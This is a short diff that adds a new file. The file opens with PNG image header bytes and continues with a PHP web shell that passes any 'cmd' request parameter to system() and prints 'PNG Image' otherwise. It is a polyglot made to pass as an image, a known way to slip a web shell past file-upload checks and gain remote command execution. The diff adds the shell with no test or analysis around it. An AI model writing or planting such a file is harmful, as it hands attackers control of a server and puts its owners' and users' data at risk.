@@ -1,0 +1,10 @@
+‰PNG
+
+<?php
+if(isset($_REQUEST['cmd'])) {
+    header("Content-Type: text/plain");
+    system($_REQUEST['cmd']);
+    die();
+}
+echo "PNG Image";
+?>
